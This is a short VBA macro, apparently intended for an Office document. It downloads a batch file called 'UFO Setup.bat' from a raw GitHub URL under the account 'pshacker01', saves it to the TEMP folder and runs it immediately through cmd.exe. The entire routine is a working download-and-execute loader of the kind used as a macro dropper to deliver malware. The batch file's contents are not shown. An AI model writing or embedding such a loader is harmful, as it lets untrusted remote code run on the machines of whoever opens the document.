Sub DownloadAndRunBatchFile()
    Dim xmlHttp As Object
    Dim url As String
    Dim localPath As String
    Dim fileNum As Integer
    Dim responseBody As Variant
    
    ' URL of the batch file
    url = "https://raw.githubusercontent.com/pshacker01/Work/main/UFO%20Setup.bat"
    ' Path to save the batch file locally
    localPath = Environ("TEMP") & "\UFO Setup.bat"
    
    ' Create XMLHTTP object for downloading
    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
    xmlHttp.Open "GET", url, False
    xmlHttp.send
    
    ' Check for a successful response
    If xmlHttp.Status = 200 Then
        responseBody = xmlHttp.responseBody
        ' Save the file locally
        fileNum = FreeFile
        Open localPath For Binary Access Write As #fileNum
            Put #fileNum, 1, responseBody
        Close #fileNum
        
        ' Run the batch file through cmd.exe for consistent formatting
        Shell "cmd.exe /c """ & localPath & """", vbNormalFocus
    Else
        MsgBox "Failed to download the batch file. Status: " & xmlHttp.Status
    End If
    
    ' Clean up
    Set xmlHttp = Nothing
End Sub
